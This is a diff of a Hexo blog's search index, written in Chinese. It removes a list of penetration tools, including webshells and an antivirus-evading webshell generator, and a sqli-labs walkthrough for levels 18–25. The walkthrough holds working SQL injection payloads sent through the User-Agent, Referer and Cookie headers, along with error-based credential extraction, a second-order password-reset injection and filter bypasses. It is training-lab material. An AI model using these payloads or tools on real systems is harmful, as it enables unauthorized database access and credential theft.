-<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
-<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
-<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
-]]></content>
-      <categories>
-        <category>工具手册</category>
-      </categories>
-      <tags>
-        <tag>工具手册</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
-    <url>/posts/ccb4aa11/</url>
-    <content><![CDATA[<p>原因:本机的VMware Network Adapter VMnet8的和虚拟机设置的网段不一样<br>设置网络适配器与虚拟机的网段一致，之后便可以ping通</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1307,10 +1295,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
+    <url>/posts/ccb4aa11/</url>
+    <content><![CDATA[<p>原因:本机的VMware Network Adapter VMnet8的和虚拟机设置的网段不一样<br>设置网络适配器与虚拟机的网段一致，之后便可以ping通</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo图片插入测试1</title>
     <url>/posts/e6200c63/</url>
     <content><![CDATA[<p><img src="/posts/e6200c63/test.PNG"></p>
 <hr>
+]]></content>
+  </entry>
+  <entry>
+    <title>hexo图片插入测试2</title>
+    <url>/posts/7f295dd9/</url>
+    <content><![CDATA[<p><img src="/posts/7f295dd9/test.PNG" alt="test"></p>
+<hr>
+<p>11111</p>
+
+
+<p>11111</p>
 ]]></content>
   </entry>
   <entry>
@@ -1325,17 +1336,6 @@
       <tags>
         <tag>Hexo</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>hexo图片插入测试2</title>
-    <url>/posts/7f295dd9/</url>
-    <content><![CDATA[<p><img src="/posts/7f295dd9/test.PNG" alt="test"></p>
-<hr>
-<p>11111</p>
-
-
-<p>11111</p>
-]]></content>
   </entry>
   <entry>
     <title>hexo文章插入图片</title>
@@ -1430,145 +1430,6 @@
     <title>proxychain4配置——虚拟机无法正常走代理</title>
     <url>/posts/45d6c023/</url>
     <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>sqli-labs2</title>
-    <url>/posts/63ba4580/</url>
-    <content><![CDATA[<h3 id="18-UA注入"><a href="#18-UA注入" class="headerlink" title="18 UA注入"></a>18 UA注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p><code>check_input()</code>函数先截取前20位，</p>
-<p>如果开启GPC,去掉反斜杠，</p>
-<p>如果是十进制，有非法字符再转译掉</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          print_r(mysql_error());            </span><br><span class="line">          echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          </span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">          print_r(mysql_error());</span><br><span class="line">          ... ... </span><br></pre></td></tr></table></figure>
-
-<p>这里对<code>username</code>和<code>password</code>做了处理，但没有对<code>UA</code>处理 这里使用UA·</p>
-<p>burp suite抓包改UA <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
-<h3 id="19-Referer注入"><a href="#19-Referer注入" class="headerlink" title="19 Referer注入"></a>19 Referer注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br></pre></td></tr></table></figure>
-
-<p>改Referer <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
-<h3 id="20-Cookie注入"><a href="#20-Cookie注入" class="headerlink" title="20 Cookie注入"></a>20 Cookie注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">    $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">    $cookee <span class="operator">=</span> $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, <span class="type">time</span>()<span class="operator">+</span><span class="number">3600</span>);    </span><br><span class="line">            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Cookie is: &#x27;</span> .$cookee;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>
-
-<p>改Cookie </p>
-<p><code>uname=1.9&#39; and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1  #</code>或者</p>
-<p><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat(username,password) from users limit 0,1)a),0x7e),1)#</code></p>
-<br>
-
-<br>
-
-<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format <span class="operator">=</span> <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $<span class="type">timestamp</span> <span class="operator">=</span> <span class="type">time</span>() <span class="operator">+</span> <span class="number">3600</span>;</span><br><span class="line">        ... ...</span><br><span class="line"></span><br><span class="line">        $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">        $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>
-
-<p>和20关相比，多了base64编码 ，这个使用<code>&#39;)</code>闭合</p>
-<p><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code> base64一下</p>
-<p><code>MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code></p>
-<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            ... ... </span><br><span class="line">            $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">            $cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<p><code>&quot;</code>闭合，其余和21相同</p>
-<br>
-
-<h3 id="23-被过滤-单引号闭合-报错注入"><a href="#23-被过滤-单引号闭合-报错注入" class="headerlink" title="23 #```-- 被过滤 单引号闭合 报错注入"></a>23 <code>#```-- </code>被过滤 单引号闭合 报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>#</code>和<code>-- </code>被过滤了 使用<code>&#39;</code>闭合</p>
-<p><code>?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
-<p><code>?id=1&#39;%20 order by 5 and &#39;1&#39;=&#39;1</code>无法通过这种方式判断字段数</p>
-<p><code>?id=-1&#39; union select 1,2 and &#39;1&#39;=&#39;1</code>报错</p>
-<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>不报错</p>
-<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>报错</p>
-<p>可以判断有三个字段，2，3是回显点，但是3处输出结果只有0和1，估计是布尔型，所以把2当作输出点</p>
-<p>当然这里亦可以使用报错注入，相对简单点</p>
-<p><code>?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
-<br>
-
-<br>
-
-<h3 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24 二次注入"></a>24 二次注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass_change.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , time()<span class="number">-3600</span>);</span><br><span class="line">    header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在<code>update</code>在修改密码时，<code>$username</code>直接获取session 并没有做任何过滤处理</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#login.php</span></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    header(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>当成功登录时，<code>$_SESSION[&quot;username&quot;]</code>直接取出使用，并没有过滤，所以这里的<code>$username</code>是可控变量</p>
-<br>
-
-<br>
-
-<p>先注册一个<code>admin&#39;# </code>账号 随便设置一个密码<code>123456</code>，登录后修改密码为<code>12345</code></p>
-<p>使用<code>admin</code> 再次登录发现原密码<code>admin</code>被改成<code>12345</code></p>
-<br>
-
-<h3 id="25-or-and被过滤"><a href="#25-or-and被过滤" class="headerlink" title="25 or and被过滤"></a>25 <code>or</code> <code>and</code>被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据图片提示，<code>or</code>和<code>and</code>被过滤了  使用<code>&#39;</code>闭合</p>
-<p><code>?id=1&#39; --+</code></p>
-<p><code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 --+</code> 2,3为输出点</p>
-<p>或者 <code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 anandd &#39;1&#39;=&#39;1</code></p>
-<p>虽然被过滤掉了，但可以使用双写绕过</p>
-<br>
-
-<h3 id="25a-or-and被过滤"><a href="#25a-or-and被过滤" class="headerlink" title="25a or and被过滤"></a>25a <code>or</code> <code>and</code>被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>和25相比 少了<code>&#39;</code></p>
-<p><code>?id=1 oorrder by 3</code></p>
-<p><code>?id=0 union select 1,database(),3</code></p>
-<br>
-
